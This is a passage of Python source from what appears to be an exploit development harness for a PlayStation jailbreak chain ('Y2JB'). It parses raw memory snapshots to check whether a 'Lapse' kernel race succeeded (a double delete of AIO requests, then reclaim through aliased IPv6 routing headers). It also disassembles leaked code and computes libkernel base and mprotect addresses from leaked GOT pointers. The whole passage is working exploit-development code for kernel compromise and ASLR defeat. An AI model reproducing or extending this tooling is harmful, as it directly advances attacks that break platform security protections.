    read_fd_qword = struct.unpack_from("<Q", data, 0x230)[0]
    write_fd_qword = struct.unpack_from("<Q", data, 0x238)[0]
    tcp_info_len = struct.unpack_from("<I", data, 0x248)[0]
    tcp_state = data[0x250]
    target_req_fd = struct.unpack_from("<i", data, 0x380 + 2 * 0x28 + 0x20)[0]
    aio_ids = [struct.unpack_from("<I", data, 0x400 + i * 4)[0] for i in range(3)]
    cancel_states = [struct.unpack_from("<I", data, 0x420 + i * 4)[0] for i in range(3)]
    poll_all_states = [struct.unpack_from("<I", data, 0x430 + i * 4)[0] for i in range(3)]
    poll_target_state = struct.unpack_from("<I", data, 0x440)[0]
    main_state = struct.unpack_from("<I", data, 0x444)[0]
    worker_state = struct.unpack_from("<I", data, 0x448)[0]
    child_tid = struct.unpack_from("<Q", data, 0x690)[0]
    parent_tid = struct.unpack_from("<Q", data, 0x698)[0]

    print("[check] Y2JB lapse race-one:")
    print(f"  source_wrapper=0x{source_wrapper:016X} syscall_target=0x{syscall_target:016X}")
    print(f"  tcp fds listen={listen_fd} client={client_fd} conn={conn_fd} port={port_be} addr_len={addr_len}")
    for name, _off in ret_names[:23]:
        v = vals[name]
        print(f"  {name:20s}=0x{v:016X}({signed_qword(v)})")
    print(
        f"  barrier fds=({barrier_r},{barrier_w}) "
        f"read_slot={read_fd_qword} write_slot={write_fd_qword}"
    )
    print(f"  target_req_fd={target_req_fd} aio_ids={[hex(x) for x in aio_ids]}")
    print(f"  cancel_states={[hex(x) for x in cancel_states]} poll_all_states={[hex(x) for x in poll_all_states]}")
    print(
        f"  poll_target_state=0x{poll_target_state:08X} "
        f"main_state=0x{main_state:08X} worker_state=0x{worker_state:08X}"
    )
    print(f"  tcp_info_len=0x{tcp_info_len:X} tcp_state=0x{tcp_state:02X}")
    print(f"  worker ready={vals['worker_ready']} deleted={vals['worker_deleted']} child_tid=0x{child_tid:X} parent_tid=0x{parent_tid:X}")
    print(f"  worker cpuset=0x{vals['worker_cpuset']:016X} rtprio=0x{vals['worker_rtprio']:016X}")
    print(f"  worker_read=0x{vals['worker_read']:016X}({signed_qword(vals['worker_read'])}) worker_delete=0x{vals['worker_delete']:016X}({signed_qword(vals['worker_delete'])})")
    print("  yields_before=" + ",".join(f"0x{x:X}" for x in yields_before))
    print("  yields_after=" + ",".join(f"0x{x:X}" for x in yields_after))

    setup_ok = (
        syscall_target != 0
        and source_wrapper != 0
        and listen_fd >= 0
        and client_fd >= 0
        and conn_fd >= 0
        and vals["setsockopt_reuse"] == 0
        and vals["bind"] == 0
        and vals["getsockname"] == 0
        and vals["listen"] == 0
        and vals["connect"] == 0
        and vals["setsockopt_linger"] == 0
        and vals["aio_submit"] == 0
        and vals["aio_cancel_all"] == 0
        and vals["aio_poll_all"] == 0
        and vals["close_client"] == 0
        and vals["barrier_socketpair"] == 0
        and vals["thr_new"] == 0
        and vals["worker_ready"] == 1
        and vals["worker_rtprio"] == 0
        and signed_qword(vals["write_barrier"]) == 1
        and signed_qword(vals["thr_suspend"]) >= 0
        and vals["getsockopt_tcp_info"] == 0
        and signed_qword(vals["thr_resume"]) >= 0
        and signed_qword(vals["worker_read"]) == 1
        and target_req_fd == client_fd
        and read_fd_qword == barrier_r
        and write_fd_qword == barrier_w
        and child_tid != 0
    )
    race_signal = vals["main_delete"] == 0 and vals["worker_delete"] == 0 and main_state == 0 and worker_state == 0
    if not race_signal:
        print("[check] race-one did not get double-delete success yet")
    elif vals["worker_deleted"] != 1:
        print("[check] double-delete state observed before worker marker store")
    return setup_ok and race_signal


def check_lapse_rthdr(raw_path, args):
    def align(value, mask):
        return (value + mask) & ~mask

    n = max(1, min(getattr(args, "lapse_rthdr_count", 1), 16))
    set_loops = max(1, min(getattr(args, "lapse_rthdr_set_loops", 1), 64))
    segment_stride = 0x80
    sds_off = 0x300
    set_ret_off = align(sds_off + n * 8, 0x3F)
    get_ret_off = align(set_ret_off + n * 8, 0x3F)
    marker_offs = align(get_ret_off + n * 8, 0x3F)
    optlen_off = align(marker_offs + n * 8, 0x3F)
    rthdr_buf_off = align(optlen_off + n * 8, 0x7F)
    getbuf_off = rthdr_buf_off + 0x80
    segment_off = align(getbuf_off + n * 0x80, 0x7F)
    need_len = align(segment_off + (n + n * set_loops + n) * segment_stride + 0x80, 0x7F)

    data = raw_path.read_bytes() if raw_path.exists() else b""
    marker_off = data.rfind(b"LAPSRH1!")
    if marker_off > 0:
        print(f"[check] lapse-rthdr using last snapshot at +0x{marker_off:X} of raw len 0x{len(data):X}")
        data = data[marker_off:]
    if len(data) < min(need_len, optlen_off + n * 8):
        print(f"[check] lapse-rthdr short read: {len(data)} bytes need=0x{need_len:X}")
        return False
    if data[:8] != b"LAPSRH1!":
        print(f"[check] lapse-rthdr bad magic={data[:8]!r} len={len(data)}")
        return False

    syscall_target = struct.unpack_from("<Q", data, 0x08)[0]
    source_wrapper = struct.unpack_from("<Q", data, 0x10)[0]
    sds = [signed_qword(struct.unpack_from("<Q", data, sds_off + i * 8)[0]) for i in range(n)]
    set_rets = [signed_qword(struct.unpack_from("<Q", data, set_ret_off + i * 8)[0]) for i in range(n)]
    get_rets = [signed_qword(struct.unpack_from("<Q", data, get_ret_off + i * 8)[0]) for i in range(n)]
    markers = [struct.unpack_from("<I", data, marker_offs + i * 8)[0] for i in range(n)]
    optlens = [struct.unpack_from("<I", data, optlen_off + i * 8)[0] for i in range(n)]
    headers = [data[getbuf_off + i * 0x80:getbuf_off + i * 0x80 + 4] for i in range(n)]

    print("[check] Y2JB lapse rthdr preflight:")
    print(f"  source_wrapper=0x{source_wrapper:016X} syscall_target=0x{syscall_target:016X}")
    print(f"  rthdr_count={n} rthdr_set_loops={set_loops}")
    alias_hits = []
    for i, marker in enumerate(markers):
        expected = i + 1
        header_ok = headers[i] == b"\x00\x0E\x00\x07"
        print(
            f"  rthdr[{i:02d}] sd={sds[i]:2d} set={set_rets[i]:3d} get={get_rets[i]:3d} "
            f"len=0x{optlens[i]:X} marker=0x{marker:08X} expected={expected} header_ok={int(header_ok)}"
        )
        if sds[i] >= 0 and set_rets[i] == 0 and get_rets[i] == 0 and header_ok and marker != expected and 1 <= marker <= n:
            alias_hits.append((i, marker - 1, sds[i], sds[marker - 1]))
    if alias_hits:
        print("[check] aliased rthdr candidates:")
        for idx, aliased_idx, sd, aliased_sd in alias_hits:
            print(f"  rthdr[{idx}] sd={sd} observed marker for rthdr[{aliased_idx}] sd={aliased_sd}")
    else:
        print("[check] no rthdr alias marker observed in this attempt")
    rthdr_ok = all(
        sds[i] >= 0
        and set_rets[i] == 0
        and get_rets[i] == 0
        and optlens[i] >= 8
        and headers[i] == b"\x00\x0E\x00\x07"
        and (markers[i] == i + 1 or (1 <= markers[i] <= n))
        for i in range(n)
    )

    return (
        syscall_target != 0
        and source_wrapper != 0
        and rthdr_ok
        and (bool(alias_hits) if getattr(args, "lapse_rthdr_require_alias", False) else True)
    )


def check_lapse_race_rthdr(raw_path, args):
    def align(value, mask):
        return (value + mask) & ~mask

    n = max(1, min(args.lapse_rthdr_count, 16))
    set_loops = max(1, min(getattr(args, "lapse_rthdr_set_loops", 1), 64))
    post_yields = max(0, min(args.lapse_post_resume_yields, 64))
    sleep_ns = max(0, min(getattr(args, "lapse_post_resume_sleep_ns", 0), 1_000_000_000))
    pre_sleep_ns = max(0, min(getattr(args, "lapse_pre_suspend_sleep_ns", 0), 1_000_000_000))
    pre_barrier_yields = max(0, min(getattr(args, "lapse_pre_barrier_yields", 0), 4))
    pre_barrier_sleep_ns = max(0, min(getattr(args, "lapse_pre_barrier_sleep_ns", 0), 1_000_000_000))
    pre_barrier_getpid_loops = max(
        0,
        min(
            getattr(args, "lapse_pre_barrier_getpid_loops", 0),
            max(0, 4 - pre_barrier_yields - (1 if pre_barrier_sleep_ns else 0)),
        ),
    )
    post_poll_yields = max(0, min(getattr(args, "lapse_post_poll_yields", 0), 8))
    client_fill_len = max(0, min(getattr(args, "lapse_client_fill_len", 0), 0x10000))
    sockbuf_size = max(0, min(getattr(args, "lapse_sockbuf_size", 0), 0x100000))
    conn_drain_len = max(0, min(getattr(args, "lapse_conn_drain_len", 0), 0x200))
    pre_suspend_getpid_loops = max(0, min(getattr(args, "lapse_pre_suspend_getpid_loops", 0), 16))
    pre_suspend_yields = max(
        0,
        min(
            getattr(
                args,
                "lapse_pre_suspend_yields",
                1 if getattr(args, "lapse_pre_suspend_yield", False) else 0,
            ),
            16,
        ),
    )
    worker_ack_enabled = bool(getattr(args, "lapse_worker_ack", False))
    worker_ack_poll_ms = max(0, min(getattr(args, "lapse_worker_ack_poll_ms", 0), 1000))
    worker_ready_pipe_enabled = (
        bool(getattr(args, "lapse_worker_ready_pipe", False))
        and not worker_ack_enabled
        and worker_ack_poll_ms == 0
    )
    worker_ready_ack_enabled = (
        bool(getattr(args, "lapse_worker_ready_ack", False))
        and not worker_ack_enabled
        and worker_ack_poll_ms == 0
        and not worker_ready_pipe_enabled
    )
    worker_after_read_ack_enabled = (
        bool(getattr(args, "lapse_worker_after_read_ack", False))
        and not worker_ack_enabled
        and worker_ack_poll_ms == 0
        and not worker_ready_pipe_enabled
        and not worker_ready_ack_enabled
    )
    worker_park_enabled = bool(getattr(args, "lapse_worker_park", False))
    block_workers_enabled = bool(getattr(args, "lapse_block_workers", False))
    block_worker_count = max(1, min(getattr(args, "lapse_block_worker_count", 1), 2))
    extra_segments = post_yields + (1 if (worker_ack_enabled or worker_ack_poll_ms) else 0) + (1 if sleep_ns else 0)
    pre_timing_segments = (
        pre_suspend_yields
        + (1 if pre_sleep_ns else 0)
        + pre_suspend_getpid_loops
        + (1 if worker_after_read_ack_enabled else 0)
        + post_poll_yields
        + (1 if conn_drain_len else 0)
    )
    sds_off = 0x1A00 if (
        worker_ack_enabled
        or worker_ready_ack_enabled
        or worker_ready_pipe_enabled
        or worker_after_read_ack_enabled
    ) else 0x1900
    set_ret_off = align(sds_off + n * 8, 0x3F)
    get_ret_off = align(set_ret_off + n * 8, 0x3F)
    marker_offs = align(get_ret_off + n * 8, 0x3F)
    optlen_off = align(marker_offs + n * 8, 0x3F)
    rthdr_buf_off = align(optlen_off + n * 8, 0x7F)
    getbuf_off = rthdr_buf_off + 0x80
    segment_off = max(
        align(getbuf_off + n * 0x80, 0x7F),
        align(0x2D80 + pre_timing_segments * 0x80, 0x7F),
    )
    segment_count = n + n * set_loops + n + extra_segments
    need_len = align(segment_off + segment_count * 0x80 + 0x80, 0x7F)
    parse_need_len = max(0x5C0, getbuf_off + n * 0x80)

    raw_data = raw_path.read_bytes() if raw_path.exists() else b""
    data = raw_data
    valid_stages = {1, 2, 3, 4, 10, 11, 12}
    marker_off = -1
    search_off = 0
    while True:
        found = raw_data.find(b"LAPSRH2!", search_off)
        if found < 0:
            break
        search_off = found + 1
        candidate = raw_data[found:]
        if len(candidate) >= parse_need_len:
            stage = struct.unpack_from("<Q", candidate, 0x18)[0]
            if stage in valid_stages:
                marker_off = found
                data = candidate
    if marker_off > 0:
        print(f"[check] lapse-race-rthdr using last valid snapshot at +0x{marker_off:X} of raw len 0x{len(raw_data):X}")
    if data[:8] != b"LAPSRH2!":
        print(f"[check] lapse-race-rthdr bad magic={data[:8]!r} len={len(data)}")
        return False
    if len(data) < parse_need_len:
        print(f"[check] lapse-race-rthdr short read: {len(data)} bytes need=0x{need_len:X}")
        if len(data) >= 0x500:
            main_delete = struct.unpack_from("<Q", data, 0xB8)[0]
            worker_delete = struct.unpack_from("<Q", data, 0xF8)[0]
            poll_target_state = struct.unpack_from("<I", data, 0x440)[0]
            main_state = struct.unpack_from("<I", data, 0x444)[0]
            worker_state = struct.unpack_from("<I", data, 0x448)[0]
            worker_read = struct.unpack_from("<Q", data, 0xF0)[0]
            worker_deleted = struct.unpack_from("<Q", data, 0x100)[0]
            print(
                f"  partial race: main_delete=0x{main_delete:016X}({signed_qword(main_delete)}) "
                f"worker_delete=0x{worker_delete:016X}({signed_qword(worker_delete)}) "
                f"poll=0x{poll_target_state:08X} main_state=0x{main_state:08X} "
                f"worker_state=0x{worker_state:08X} worker_read={signed_qword(worker_read)} "
                f"worker_deleted={worker_deleted}"
            )
        return False
    if len(data) < need_len:
        print(
            f"[check] lapse-race-rthdr truncated tail: {len(data)} bytes "
            f"need=0x{need_len:X}; parsing race/rthdr fields through 0x{parse_need_len:X}"
        )

    syscall_target = struct.unpack_from("<Q", data, 0x08)[0]
    source_wrapper = struct.unpack_from("<Q", data, 0x10)[0]
    snapshot_stage = struct.unpack_from("<Q", data, 0x18)[0]
    listen_fd = signed_qword(struct.unpack_from("<Q", data, 0x20)[0])
    client_fd = signed_qword(struct.unpack_from("<Q", data, 0x48)[0])
    conn_fd = signed_qword(struct.unpack_from("<Q", data, 0x58)[0])
    main_delete = struct.unpack_from("<Q", data, 0xB8)[0]
    worker_delete = struct.unpack_from("<Q", data, 0xF8)[0]
    thr_new_ret = signed_qword(struct.unpack_from("<Q", data, 0x90)[0])
    release_write = signed_qword(struct.unpack_from("<Q", data, 0x98)[0])
    suspend_ret = signed_qword(struct.unpack_from("<Q", data, 0xA0)[0])
    poll_target_ret = signed_qword(struct.unpack_from("<Q", data, 0xA8)[0])
    tcp_info_ret = signed_qword(struct.unpack_from("<Q", data, 0xB0)[0])
    resume_ret = signed_qword(struct.unpack_from("<Q", data, 0xC0)[0])
    barrier_r = struct.unpack_from("<i", data, 0x228)[0]
    barrier_w = struct.unpack_from("<i", data, 0x22C)[0]
    read_fd_qword = struct.unpack_from("<Q", data, 0x230)[0]
    write_fd_qword = struct.unpack_from("<Q", data, 0x238)[0]
    poll_target_state = struct.unpack_from("<I", data, 0x440)[0]
    main_state = struct.unpack_from("<I", data, 0x444)[0]
    worker_state = struct.unpack_from("<I", data, 0x448)[0]
    aio_ids = [struct.unpack_from("<I", data, 0x400 + i * 4)[0] for i in range(3)]
    cancel_states = [struct.unpack_from("<I", data, 0x420 + i * 4)[0] for i in range(3)]
    poll_all_states = [struct.unpack_from("<I", data, 0x430 + i * 4)[0] for i in range(3)]
    worker_read = struct.unpack_from("<Q", data, 0xF0)[0]
    worker_deleted = struct.unpack_from("<Q", data, 0x100)[0]
    worker_cpuset = signed_qword(struct.unpack_from("<Q", data, 0xE0)[0])
    worker_rtprio = signed_qword(struct.unpack_from("<Q", data, 0xE8)[0])
    ack_write = signed_qword(struct.unpack_from("<Q", data, 0x108)[0])
    ack_socketpair = signed_qword(struct.unpack_from("<Q", data, 0x118)[0])
    ack_read = signed_qword(struct.unpack_from("<Q", data, 0x120)[0])
    ack_after_marker = struct.unpack_from("<Q", data, 0x128)[0]
    worker_ready_write = signed_qword(struct.unpack_from("<Q", data, 0x138)[0])
    main_ready_read = signed_qword(struct.unpack_from("<Q", data, 0x140)[0])
    worker_park_read = signed_qword(struct.unpack_from("<Q", data, 0x148)[0])
    main_cpuset = signed_qword(struct.unpack_from("<Q", data, 0x160)[0])
    main_rtprio = signed_qword(struct.unpack_from("<Q", data, 0x168)[0])
    ack_pollfd_fd = struct.unpack_from("<i", data, 0x460)[0]
    ack_pollfd_events = struct.unpack_from("<h", data, 0x464)[0]
    ack_pollfd_revents = struct.unpack_from("<h", data, 0x466)[0]
    block_socketpair = signed_qword(struct.unpack_from("<Q", data, 0x170)[0])
    block_aio_submit = signed_qword(struct.unpack_from("<Q", data, 0x178)[0])
    block_pipe = tuple(struct.unpack_from("<ii", data, 0x5C0))
    block_req_fds = [
        struct.unpack_from("<i", data, 0x6A0 + i * 0x28 + 0x20)[0]
        for i in range(block_worker_count)
    ]
    block_id = struct.unpack_from("<I", data, 0x6F0)[0]
    pre_suspend_yield_results = [
        signed_qword(struct.unpack_from("<Q", data, 0x130 + i * 8)[0])
        for i in range(pre_suspend_yields)
    ]
    pre_barrier_results = [
        signed_qword(struct.unpack_from("<Q", data, 0x180 + i * 8)[0])
        for i in range(pre_barrier_yields)
    ]
    pre_barrier_getpid_results = [
        signed_qword(struct.unpack_from("<Q", data, 0x5C0 + i * 8)[0])
        for i in range(pre_barrier_getpid_loops)
    ]
    pre_barrier_sleep = signed_qword(struct.unpack_from("<Q", data, 0x570)[0])
    pre_suspend_getpid_results = [
        signed_qword(struct.unpack_from("<Q", data, 0x1C0 + i * 8)[0])
        for i in range(pre_suspend_getpid_loops)
    ]
    post_poll_yield_results = [
        signed_qword(struct.unpack_from("<Q", data, 0x520 + i * 8)[0])
        for i in range(post_poll_yields)
    ]
    pre_suspend_sleep = signed_qword(struct.unpack_from("<Q", data, 0x150)[0])
    post_resume_sleep = signed_qword(struct.unpack_from("<Q", data, 0x158)[0])
    tcp_state = data[0x250]

    sds = [signed_qword(struct.unpack_from("<Q", data, sds_off + i * 8)[0]) for i in range(n)]
    set_rets = [signed_qword(struct.unpack_from("<Q", data, set_ret_off + i * 8)[0]) for i in range(n)]
    get_rets = [signed_qword(struct.unpack_from("<Q", data, get_ret_off + i * 8)[0]) for i in range(n)]
    markers = [struct.unpack_from("<I", data, marker_offs + i * 8)[0] for i in range(n)]
    optlens = [struct.unpack_from("<I", data, optlen_off + i * 8)[0] for i in range(n)]
    headers = [data[getbuf_off + i * 0x80:getbuf_off + i * 0x80 + 4] for i in range(n)]

    print("[check] Y2JB lapse race+rthdr:")
    print(f"  source_wrapper=0x{source_wrapper:016X} syscall_target=0x{syscall_target:016X}")
    if (
        getattr(args, "lapse_pre_reclaim_send", False)
        or getattr(args, "lapse_pre_delete_send", False)
        or getattr(args, "lapse_debug_sends", False)
        or getattr(args, "lapse_after_ack_send", False)
    ):
        print(
            f"  snapshot_stage={snapshot_stage} "
            f"(10=start, 11=after-rthdr-open, 12=after-ack, 3=pre-delete, "
            f"4=post-main-delete, "
            f"1=pre-reclaim, 2=post-reclaim)"
        )
    target_req_index = max(0, min(getattr(args, "lapse_target_req_index", 2), 2))
    print(f"  rthdr_count={n} rthdr_set_loops={set_loops} target_req_index={target_req_index}")
    print(f"  tcp fds listen={listen_fd} client={client_fd} conn={conn_fd} tcp_state=0x{tcp_state:02X}")
    print(
        f"  syscall rets thr_new={thr_new_ret} release_write={release_write} "
        f"suspend={suspend_ret} poll_target={poll_target_ret} tcp_info={tcp_info_ret} "
        f"resume={resume_ret}"
    )
    print(
        "  aio_ids="
        + ",".join(f"0x{x:08X}" for x in aio_ids)
        + " cancel_states="
        + ",".join(f"0x{x:08X}" for x in cancel_states)
        + " poll_all_states="
        + ",".join(f"0x{x:08X}" for x in poll_all_states)
    )
    print(
        f"  barrier fds=({barrier_r},{barrier_w}) "
        f"read_slot={read_fd_qword} write_slot={write_fd_qword}"
    )
    print(
        f"  poll_target_state=0x{poll_target_state:08X} "
        f"main_state=0x{main_state:08X} worker_state=0x{worker_state:08X}"
    )
    print(
        f"  main_delete=0x{main_delete:016X}({signed_qword(main_delete)}) "
        f"worker_delete=0x{worker_delete:016X}({signed_qword(worker_delete)}) "
        f"worker_read={signed_qword(worker_read)} worker_deleted={worker_deleted}"
    )
    print(f"  worker_prio_pin cpuset={worker_cpuset} rtprio={worker_rtprio}")
    if worker_ack_enabled:
        print(
            f"  worker_ack socketpair={ack_socketpair} write={ack_write} "
            f"main_read={ack_read}"
        )
    if worker_ack_poll_ms:
        print(
            f"  worker_ack_poll_ms={worker_ack_poll_ms} socketpair={ack_socketpair} "
            f"write={ack_write} after_marker={ack_after_marker} poll={ack_read} "
            f"pollfd=(fd={ack_pollfd_fd},events=0x{ack_pollfd_events & 0xFFFF:04X},"
            f"revents=0x{ack_pollfd_revents & 0xFFFF:04X})"
        )
    if worker_ready_ack_enabled:
        print(
            f"  worker_ready_ack worker_write={worker_ready_write} "
            f"main_read={main_ready_read}"
        )
    if worker_ready_pipe_enabled:
        print(
            f"  worker_ready_pipe worker_write={worker_ready_write} "
            f"main_read={main_ready_read} socketpair={ack_socketpair}"
        )
    if worker_after_read_ack_enabled:
        print(
            f"  worker_after_read_ack worker_write={worker_ready_write} "
            f"main_read={main_ready_read} socketpair={ack_socketpair}"
        )
    if worker_park_enabled:
        if worker_ack_poll_ms:
            print(f"  worker_park second_read_result={worker_park_read}")
        else:
            print(f"  worker_park second_read_result={ack_write}")
    if block_workers_enabled:
        print(
            f"  block_workers count={block_worker_count} socketpair={block_socketpair} "
            f"aio_submit={block_aio_submit} pipe=({block_pipe[0]},{block_pipe[1]}) "
            f"req_fds={block_req_fds} id=0x{block_id:08X}"
        )
    if getattr(args, "lapse_main_prio_pin", False):
        print(f"  main_prio_pin cpuset={main_cpuset} rtprio={main_rtprio}")
    if pre_suspend_yields:
        print(f"  pre_suspend_yields={pre_suspend_yields} results={pre_suspend_yield_results}")
    if pre_barrier_yields:
        print(f"  pre_barrier_yields={pre_barrier_yields} results={pre_barrier_results}")
    if pre_barrier_sleep_ns:
        print(f"  pre_barrier_sleep_ns={pre_barrier_sleep_ns} result={pre_barrier_sleep}")
    if pre_barrier_getpid_loops:
        print(
            f"  pre_barrier_getpid_loops={pre_barrier_getpid_loops} "
            f"results={pre_barrier_getpid_results}"
        )
    if pre_suspend_getpid_loops:
        print(
            f"  pre_suspend_getpid_loops={pre_suspend_getpid_loops} "
            f"results={pre_suspend_getpid_results}"
        )
    if post_poll_yields:
        print(f"  post_poll_yields={post_poll_yields} results={post_poll_yield_results}")
    if sockbuf_size or client_fill_len or conn_drain_len:
        sockbuf_client = signed_qword(struct.unpack_from("<Q", data, 0x5A0)[0])
        sockbuf_conn = signed_qword(struct.unpack_from("<Q", data, 0x5A8)[0])
        fill_ret = signed_qword(struct.unpack_from("<Q", data, 0x5B0)[0])
        drain_ret = signed_qword(struct.unpack_from("<Q", data, 0x5B8)[0])
        print(
            f"  linger_widen sockbuf=0x{sockbuf_size:X} "
            f"client_set={sockbuf_client} conn_set={sockbuf_conn} "
            f"fill_len=0x{client_fill_len:X} fill_write={fill_ret} "
            f"drain_len=0x{conn_drain_len:X} conn_read={drain_ret}"
        )
    if pre_sleep_ns:
        print(f"  pre_suspend_sleep_ns={pre_sleep_ns} result={pre_suspend_sleep}")
    if sleep_ns:
        print(f"  post_resume_sleep_ns={sleep_ns} result={post_resume_sleep}")

    alias_hits = []
    for i, marker in enumerate(markers):
        expected = i + 1
        sd = sds[i]
        header_ok = headers[i] == b"\x00\x0E\x00\x07"
        ok = sd >= 0 and set_rets[i] == 0 and get_rets[i] == 0 and optlens[i] >= 8 and header_ok
        print(
            f"  rthdr[{i:02d}] sd={sd:2d} set={set_rets[i]:3d} get={get_rets[i]:3d} "
            f"len=0x{optlens[i]:X} marker=0x{marker:08X} expected={expected} header_ok={int(header_ok)}"
        )
        if ok and marker != expected and 1 <= marker <= n:
            alias_hits.append((i, marker - 1, sd, sds[marker - 1]))

    setup_ok = (
        syscall_target != 0
        and source_wrapper != 0
        and listen_fd >= 0
        and client_fd >= 0
        and conn_fd >= 0
        and signed_qword(worker_read) == 1
    )
    delete_syscalls_ok = main_delete == 0 and worker_delete == 0
    race_errors_match = main_state == worker_state
    race_state_zero = main_state == 0 and worker_state == 0
    worker_done = worker_deleted == 1
    race_signal = delete_syscalls_ok and race_errors_match and race_state_zero
    print(
        f"  race delete_syscalls_ok={int(delete_syscalls_ok)} "
        f"errors_match={int(race_errors_match)} state_zero={int(race_state_zero)} "
        f"worker_done={int(worker_done)}"
    )
    if alias_hits:
        print("[check] aliased rthdr candidates:")
        for idx, aliased_idx, sd, aliased_sd in alias_hits:
            print(f"  rthdr[{idx}] sd={sd} observed marker for rthdr[{aliased_idx}] sd={aliased_sd}")
    else:
        print("[check] no rthdr alias marker observed in this attempt")
    if not delete_syscalls_ok:
        print("[check] one of the aio_multi_delete syscalls failed")
    elif not race_errors_match:
        print("[check] aio delete error states mismatch; this is not the reference Lapse condition")
    elif not race_state_zero:
        print("[check] aio delete error states match but are nonzero")
    elif worker_deleted != 1:
        print("[check] double-delete state observed before worker marker store")
    rthdr_ok = all(
        sds[i] >= 0
        and set_rets[i] == 0
        and get_rets[i] == 0
        and optlens[i] >= 8
        and headers[i] == b"\x00\x0E\x00\x07"
        and (markers[i] == i + 1 or (1 <= markers[i] <= n))
        for i in range(n)
    )
    worker_ack_ok = (
        not worker_ack_enabled
        or (worker_deleted == 1 and ack_socketpair == 0 and ack_write == 1 and ack_read == 1)
    )
    worker_ack_poll_ok = (
        worker_ack_poll_ms == 0
        or (
            ack_write == 1
            and ack_after_marker == 1
            and ack_read > 0
            and (ack_pollfd_revents & 0x0001) != 0
        )
    )
    worker_ready_ack_ok = (
        not (worker_ready_ack_enabled or worker_ready_pipe_enabled)
        or (worker_ready_write == 1 and main_ready_read == 1)
    )
    block_workers_ok = (
        not block_workers_enabled
        or (
            block_socketpair == 0
            and block_aio_submit == 0
            and all(fd >= 0 for fd in block_pipe)
            and all(fd == block_pipe[0] for fd in block_req_fds)
            and block_id != 0
        )
    )
    if worker_ack_enabled and not worker_ack_ok:
        print("[check] worker ack did not complete cleanly")
    if worker_ack_poll_ms and not worker_ack_poll_ok:
        print("[check] worker ack poll did not complete cleanly")
    if (worker_ready_ack_enabled or worker_ready_pipe_enabled) and not worker_ready_ack_ok:
        print("[check] worker ready sync did not complete cleanly")
    if block_workers_enabled and not block_workers_ok:
        print("[check] block-worker precondition did not complete cleanly")
    if getattr(args, "lapse_require_worker_done", False) and not worker_done:
        print("[check] worker completion marker is required for this run")
    if args.lapse_rthdr_require_alias:
        return (
            setup_ok
            and race_signal
            and worker_ack_ok
            and worker_ack_poll_ok
            and worker_ready_ack_ok
            and block_workers_ok
            and worker_done
            and rthdr_ok
            and bool(alias_hits)
        )
    if getattr(args, "lapse_require_worker_done", False):
        return (
            setup_ok
            and race_signal
            and worker_ack_ok
            and worker_ack_poll_ok
            and worker_ready_ack_ok
            and block_workers_ok
            and worker_done
            and rthdr_ok
        )
    return (
        setup_ok
        and race_signal
        and worker_ack_ok
        and worker_ack_poll_ok
        and worker_ready_ack_ok
        and block_workers_ok
        and rthdr_ok
    )


def check_code_read(raw_path, args):
    data = raw_path.read_bytes() if raw_path.exists() else b""
    read_len = max(1, min(args.code_read_len, 0x1000))
    msg_len = max(0x80 + read_len, min(args.code_read_msg_len, 0x4000))
    if len(data) < msg_len:
        print(f"[check] code-read short read: {len(data)} bytes need={msg_len}")
        return False
    header = data[:msg_len]
    code = data[0x80:0x80 + read_len]
    print("[check] code-read result:")
    print(f"  source={args.code_read_source} flavor={args.code_read_flavor}")
    print(f"  wrapper_offset={args.code_read_wrapper_offset}")
    print(f"  adjust=0x{args.code_read_adjust & 0xFFFFFFFFFFFFFFFF:X}({signed_qword(args.code_read_adjust & 0xFFFFFFFFFFFFFFFF)})")
    print(f"  code_len=0x{read_len:X} total_raw={len(data)}")
    if len(header) >= 0x30:
        source_ptr, code_ptr, sent_len, source_off, wrapper_off, adjust = struct.unpack("<QQQQQQ", header[:0x30])
        print(f"  source_ptr=0x{source_ptr:016X}")
        print(f"  code_ptr=0x{code_ptr:016X}")
        print(f"  sent_len=0x{sent_len:X}")
        print(f"  source_off=0x{source_off:X}")
        print(f"  wrapper_off=0x{wrapper_off:X}")
        print(f"  header_adjust=0x{adjust:016X}({signed_qword(adjust)})")
        if len(header) >= 0x38:
            memcpy_ret = struct.unpack("<Q", header[0x30:0x38])[0]
            print(f"  memcpy_ret=0x{memcpy_ret:016X}({signed_qword(memcpy_ret)})")
        if len(header) >= 0x40:
            copy_dst = struct.unpack("<Q", header[0x38:0x40])[0]
            print(f"  copy_dst=0x{copy_dst:016X}")
    elif header:
        print(f"  header short: {len(header)} bytes")

    print("  code hexdump:")
    for off in range(0, min(len(code), 0x100), 16):
        chunk = code[off:off + 16]
        print(f"    +0x{off:04X}: {' '.join(f'{b:02X}' for b in chunk)}")
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        base = 0
        if len(header) >= 0x10:
            base = struct.unpack("<Q", header[8:16])[0]
        print("  disasm:")
        for idx, ins in enumerate(md.disasm(code[:0x80], base)):
            print(f"    0x{ins.address:016X}: {ins.mnemonic:<8s} {ins.op_str}")
            if idx >= 20:
                break
    except Exception as exc:
        print(f"  disasm unavailable: {exc}")
    return any(code)


def resolve_libkernel_from_leaks(leaks):
    resolved = []
    for image, offsets in LIBKERNEL_CANDIDATES:
        rows = []
        pages = []
        for symbol in ("send", "sceKernelDlsym"):
            leak = leaks.get(symbol, 0)
            offset = offsets[symbol]
            raw_base = leak - offset if leak else 0
            page_base = raw_base & ~(LIB_PAGE_SIZE - 1) if leak else 0
            delta = raw_base - page_base if leak else 0
            rows.append(
                {
                    "symbol": symbol,
                    "leak": leak,
                    "offset": offset,
                    "raw_base": raw_base,
                    "page_base": page_base,
                    "page_delta": delta,
                }
            )
            if leak:
                pages.append(page_base)
        consensus = pages[0] if pages and all(page == pages[0] for page in pages) else 0
        resolved.append(
            {
                "image": image,
                "page_base": consensus,
                "mprotect_offset": offsets["mprotect"],
                "mprotect": consensus + offsets["mprotect"] if consensus else 0,
                "rows": rows,
                "page_consensus": bool(consensus),
            }
        )
    return resolved


def print_libkernel_resolution(leaks, out_json=None):
    print_got_leak(leaks)
    resolved = resolve_libkernel_from_leaks(leaks)
    print("\n[resolve] libkernel candidates from live GOT:")
    for item in resolved:
        status = "OK" if item["page_consensus"] else "MISMATCH"
        print(f"  {item['image']}: page_base=0x{item['page_base']:016X} {status}")
        for row in item["rows"]:
            print(
                "    "
                f"{row['symbol']:14s}: leak=0x{row['leak']:016X} "
                f"off=0x{row['offset']:X} raw_base=0x{row['raw_base']:016X} "
                f"page_delta=0x{row['page_delta']:X}"
            )
        print(
            f"    mprotect candidate: 0x{item['mprotect']:016X} "
            f"(+0x{item['mprotect_offset']:X})"
        )

